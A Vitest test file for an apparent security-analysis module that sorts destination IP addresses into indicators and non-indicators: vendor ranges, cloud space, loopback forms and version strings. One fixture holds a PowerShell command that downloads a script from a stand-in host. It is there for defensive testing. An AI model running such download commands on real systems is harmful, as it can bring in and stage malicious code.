// #1530 — which destination addresses are indicators. The two halves that matter: a single-tenant
// vendor range is not an indicator, and cloud compute / open CDN space still is.
import { describe, it, expect } from "vitest";
import {
  VENDOR_RANGES,
  isNonIndicatorAddress,
  isNonIndicatorVendorIp,
  looksLikeVersionString,
  vendorForIp,
  vendorNote,
} from "../../src/analysis/ipHygiene.js";

describe("vendorForIp — published single-tenant ranges", () => {
  it.each([
    ["the OneDrive front door", "52.123.242.227", "Microsoft"],
    ["a second address in the same block", "52.123.242.240", "Microsoft"],
    ["Microsoft 365 service space", "52.110.19.195", "Microsoft"],
    ["the 150.171 block", "150.171.109.82", "Microsoft"],
    ["an Akamai deploy node", "23.221.30.94", "Akamai"],
    ["the low Akamai block", "23.11.40.157", "Akamai"],
  ])("names %s", (_label, ip, vendor) => {
    expect(vendorForIp(ip)).toEqual({ vendor, tier: "single-tenant" });
    expect(isNonIndicatorVendorIp(ip)).toBe(true);
  });
});

describe("vendorForIp — space an intruder can occupy stays an indicator", () => {
  // Every one of these is a range the issue or a blog would happily call "Microsoft" or "CDN".
  // Each is rentable or multi-tenant, so calling it non-indicator would hide a real C2.
  it.each([
    ["Azure compute (13.64/11)", "13.70.1.1"],
    ["Azure compute (20.33/11)", "20.40.1.1"],
    ["Azure compute (40.74/15)", "40.74.1.1"],
    ["Azure cloud in RIPE space", "172.179.80.7"],
    ["an ISP subscriber range", "82.102.152.51"],
    ["a broadband range", "98.66.133.186"],
  ])("does not excuse %s", (_label, ip) => {
    expect(isNonIndicatorVendorIp(ip)).toBe(false);
  });

  it("names a Cloudflare edge but keeps it an indicator", () => {
    expect(vendorForIp("104.16.1.1")).toEqual({ vendor: "Cloudflare", tier: "open-cdn" });
    expect(isNonIndicatorVendorIp("104.16.1.1")).toBe(false);
    expect(vendorNote("104.16.1.1")).toContain("the edge is not the origin");
  });

  it("explains a single-tenant hit in the note", () => {
    expect(vendorNote("150.171.109.82")).toBe(
      "vendor: Microsoft (published service range — not an indicator on its own)",
    );
    expect(vendorNote("203.0.113.9")).toBe("");
  });
});

describe("VENDOR_RANGES table", () => {
  it("parses every row (a row that does not parse is silently dead)", () => {
    for (const r of VENDOR_RANGES) {
      const [net, bits] = r.cidr.split("/");
      expect(net.split(".").every((o) => Number(o) >= 0 && Number(o) <= 255)).toBe(true);
      expect(Number(bits)).toBeGreaterThanOrEqual(1);
      expect(Number(bits)).toBeLessThanOrEqual(32);
      // The network address must already be masked — 23.0.1.0/12 would quietly cover the wrong span.
      expect(vendorForIp(net)).toEqual({ vendor: r.vendor, tier: r.tier });
    }
  });
});

describe("isNonIndicatorAddress — loopback in every spelling", () => {
  it.each([
    ["Sysmon's expanded loopback", "0:0:0:0:0:0:0:1"],
    ["the compressed form", "::1"],
    ["the fully padded form", "0000:0000:0000:0000:0000:0000:0000:0001"],
    ["the unspecified address", "::"],
    ["IPv4 loopback", "127.0.0.1"],
    ["another loopback address", "127.0.0.53"],
    ["IPv4-mapped loopback", "::ffff:127.0.0.1"],
    ["the unspecified quad", "0.0.0.0"],
    ["a recorded absence", "-"],
    ["a bracketed loopback", "[::1]"],
  ])("drops %s", (_label, v) => {
    expect(isNonIndicatorAddress(v)).toBe(true);
  });

  it.each([
    ["a real address", "52.123.242.227"],
    ["a real IPv6 address", "2606:4700::1111"],
    ["an internal address", "10.0.0.162"],
  ])("keeps %s", (_label, v) => {
    expect(isNonIndicatorAddress(v)).toBe(false);
  });
});

describe("looksLikeVersionString", () => {
  it("reads a module version as a version, not an address", () => {
    const text = "$script:ModuleVersion = '1.0.0.0'\r\n";
    expect(looksLikeVersionString(text, text.indexOf("1.0.0.0"))).toBe(true);
  });

  it("reads a chocolatey --version the same way", () => {
    const text = "choco install openssh --version 8.0.0.1";
    expect(looksLikeVersionString(text, text.indexOf("8.0.0.1"))).toBe(true);
  });

  it("leaves a real address alone", () => {
    const text = "Invoke-WebRequest -Uri http://203.0.113.9/a.ps1";
    expect(looksLikeVersionString(text, text.indexOf("203.0.113.9"))).toBe(false);
  });
});
